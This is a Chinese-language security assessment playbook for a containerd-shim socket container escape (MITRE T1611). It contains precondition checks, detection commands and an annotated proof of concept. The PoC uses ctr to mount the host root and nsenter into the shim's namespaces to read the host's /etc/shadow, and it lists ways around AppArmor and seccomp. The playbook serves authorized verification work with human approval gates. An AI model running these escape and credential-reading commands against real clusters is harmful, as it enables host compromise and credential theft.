---
source: manual
confidence: high
platforms: [containerd]
required_tools: []
execution_contexts: [L0, L1, L3]
max_verification_level: L3
destructive: true
mapped_attack_surfaces: [AS-1.7]
mapped_compliance_families: [containerd暴露, 特权容器]
---

# containerd-shim-escape — containerd-shim Socket 逃逸

containerd-shim 的 socket 可被容器内进程访问，攻击者通过该 socket 与 containerd-shim 交互，利用 PID namespace 共享实现容器逃逸。

---

## 1. 前置条件

- 容器以特权模式运行，或 containerd-shim socket 被显式挂载/可访问到容器内
- 容器能访问 `/run/containerd/` 或 containerd-shim 的抽象 socket
- containerd-shim 进程与容器共享 PID namespace（容器可看到 shim 进程）

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 特权模式
kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

# [L0] 宿主机观察：确认 containerd socket 位置
ls -la /run/containerd/containerd.sock
# 期望输出: srw-rw---- ... /run/containerd/containerd.sock

# [L1] 容器内观察：确认 containerd socket 可访问
kubectl exec -n <ns> <pod-name> -- ls -la /run/containerd/containerd.sock 2>/dev/null
# 期望输出: srw-rw---- ... /run/containerd/containerd.sock
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 containerd 版本
containerd --version
# 期望输出: containerd containerd.io 1.6.x 或当前版本

# [L0] 宿主机观察：检查 containerd-shim socket 在宿主机上的状态
ss -lx | grep containerd
# 期望输出: 含 /run/containerd/ 路径的 socket

# [L0] 宿主机观察：监听容器 shim 的抽象 socket
ss -lxp | grep "containerd-shim\|@containerd"
# 期望输出: 指向具体 shim PID 的抽象 socket

# [L1] 容器内观察：确认 containerd socket 可访问
kubectl exec -n <ns> <pod-name> -- ls -la /run/containerd/ 2>/dev/null
# 期望输出: 含 containerd.sock（确认挂载）

# [L1] 容器内观察：通过 crictl 或 ctr 与 containerd 交互（若有 CLI）
kubectl exec -n <ns> <pod-name> -- ctr version 2>/dev/null || kubectl exec -n <ns> <pod-name> -- crictl version 2>/dev/null
# 期望输出: containerd 版本信息（确认 API 可达）

# [L1] 容器内观察：检查容器是否共享 PID namespace（可见宿主机进程）
kubectl exec -n <ns> <pod-name> -- ps aux 2>/dev/null | grep -c "containerd-shim"
# 期望输出: > 0（可见 containerd-shim 进程）

# [L1] 容器内观察：检查抽象 socket
kubectl exec -n <ns> <pod-name> -- bash -c 'ls -la /proc/net/unix | head -1; ss -lx 2>/dev/null | grep containerd' 2>/dev/null
# 期望输出: 含 containerd-shim 相关 socket
```

## 3. 攻击验证

```bash
# [L3] 条件验证（⚠️ 不可安全复现，会通过 containerd-shim 创建逃逸进程或劫持 shim）
# 验证级别: L3-条件验证
# 不可安全复现原因: 通过 containerd-shim socket 操作可能导致 shim 进程异常，影响宿主机上所有容器

# 前置条件满足证明:
# ✅ kubectl exec <pod> -- ls -la /run/containerd/containerd.sock = 文件存在且可访问
# ✅ kubectl exec <pod> -- ps aux | grep containerd-shim 输出 > 0（PID namespace 共享）
# ✅ kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}' = true

# ⚠️ POC步骤（理论推导，实际执行会影响宿主机 containerd-shim 进程）：
#
# [L2] 步骤1: 通过 containerd socket 创建新容器（以 ctr CLI 为例）
# kubectl exec -n <ns> <pod-name> -- ctr -n k8s.io run --rm --rootfs /host_root \  # 需要宿主机根文件系统路径
#   --mount type=bind,src=/,dst=/host,options=rshared escape-poc /bin/sh
# # 预期影响: 在宿主机层面创建新容器，挂载宿主机根文件系统
#
# [L2] 步骤2: 在逃逸容器内读取宿主机文件
# kubectl exec -n <ns> <pod-name> -- ctr -n k8s.io exec --exec-id escape-exec escape-poc cat /host/etc/shadow
# # 预期输出: root:$6$...:... (宿主机 shadow 内容)
#
# [L2] 步骤3: 通过 containerd-shim PID namespace 逃逸
# # 原理：containerd-shim 与 container 进程共享 PID namespace
# # 通过 nsenter 进入 containerd-shim 进程的 PID/mount namespace
# kubectl exec -n <ns> <pod-name> -- \
#   nsenter --target $(pgrep -o containerd-shim) --mount --uts --ipc --net --pid -- bash -c 'cat /etc/shadow'
# # 预期输出: root:$6$...:... (宿主机 shadow 内容)
#
# [L2] 清理:
# kubectl exec -n <ns> <pod-name> -- ctr -n k8s.io rm -f escape-poc 2>/dev/null
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录宿主机 containerd 容器列表
ctr -n k8s.io containers list --format '{{.ID}}:{{.Runtime}}' 2>/dev/null
# 期望输出: 当前运行的容器列表（无 escape-poc）

# [L0] 攻击后环境对比：检查是否有新容器被创建
ctr -n k8s.io containers list --format '{{.ID}}:{{.Runtime}}' 2>/dev/null
# 期望输出: 出现 escape-poc 容器 → 证明通过 containerd socket 创建逃逸容器

# [L1] 攻击前：容器内无法通过 nsenter 访问宿主机进程（PID namespace 隔离）
kubectl exec -n <ns> <pod-name> -- ls /proc/1/root/etc/shadow 2>&1
# 期望输出: No such file or directory（隔离生效）

# [L2] 攻击后：通过 containerd-shim PID 逃逸读取宿主机文件
kubectl exec -n <ns> <pod-name> -- nsenter --target $(kubectl exec -n <ns> <pod-name> -- pgrep -o containerd-shim) --mount -- cat /etc/shadow 2>/dev/null | head -3
# 期望输出: root:$6$...:... (宿主机 shadow 内容) → 证明逃逸成功

# 清理
ctr -n k8s.io rm -f escape-poc 2>/dev/null
```

差分结论：攻击前容器内 PID namespace 隔离（无法访问宿主机 `/proc/1/root`），攻击后通过 containerd-shim 共享的 PID namespace 可 nsenter 进入宿主机 mount namespace 并读取 `/etc/shadow`，证明 containerd-shim socket 可被利用实现逃逸。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制 containerd socket 访问
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 containerd 限制策略 → AppArmor 可能阻断 socket 连接

# [L1] 检查 Seccomp 是否限制 connect 系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若 Seccomp: 2 (strict) → 可能阻断 socket 通信

# 绕过方式：
# - [L2] 若 containerd.sock 不可访问但 PID namespace 共享，直接 nsenter 进入 shim 进程
# - [L2] 若 ctr CLI 不可用，通过 gRPC 直接与 containerd API 交互（用 grpcurl 或自定义客户端）
# - [L2] 若抽象 socket 被限制但 PID 共享，通过 /proc/<shim_pid>/ns 进入 namespace
```

## 6. 证伪条件

```bash
# [L1] 容器内无法访问 containerd socket
kubectl exec -n <ns> <pod-name> -- ls /run/containerd/containerd.sock 2>&1
# 输出: No such file or directory → 证伪

# [L1] containerd socket 存在但无访问权限
kubectl exec -n <ns> <pod-name> -- test -r /run/containerd/containerd.sock && echo "readable" || echo "not readable"
# 输出: not readable → 证伪

# [L1] 容器未共享 PID namespace（无法看到 containerd-shim 进程）
kubectl exec -n <ns> <pod-name> -- ps aux 2>/dev/null | grep -c containerd-shim
# 输出: 0 → PID namespace 未共享，nsenter 利用路径失效 → 证伪

# [L0] Pod 非特权且 containerd socket 未挂载
kubectl get pod <pod-name> -o yaml | grep -c containerd.sock
# 输出: 0 → 证伪
```

## 7. 审批级别

- **L3** 条件验证（理论推导 containerd-shim 逃逸）→ **Level 5**（通过 containerd API 创建容器或 PID namespace 操作影响宿主机，必须人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：是（通过 containerd-shim socket 操作可能影响宿主机上所有容器）
- 最高验证层级：L3

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Privilege Escalation
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者利用容器内可访问的 containerd-shim socket 或共享的 PID namespace，通过 containerd API 创建挂载宿主机文件系统的逃逸容器，或通过 nsenter 进入 containerd-shim 进程的 mount namespace，实现从容器到宿主机的逃逸。